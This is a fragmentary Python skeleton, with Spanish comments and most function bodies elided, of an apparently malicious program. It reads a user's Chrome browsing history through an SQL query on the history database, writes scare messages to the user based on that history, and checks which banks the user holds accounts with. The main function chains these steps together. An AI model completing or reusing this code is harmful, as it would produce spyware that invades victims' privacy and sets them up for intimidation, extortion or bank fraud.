...
def get_chrome_history(user_path):
    ...
    while not urls:
        try:
            ...
            select_statement = "SELECT title, last_visit_time, url FROM urls"
...
def check_history_and_scare_user(user_path , hacker_file, chrome_history):
...
def check_bank_account(user_path , hacker_file, chrome_history):
...
def main():
    ...
    #Recogemos su historial de chrome
    chrome_history = get_chrome_history(user_path)
    #Escribimos mensajes de miedo
    check_history_and_scare_user(user_path, hacker_file, chrome_history)
    #Miramos en que bancos tiene una cuenta abierta.
    check_bank_account(user_path , hacker_file, chrome_history)
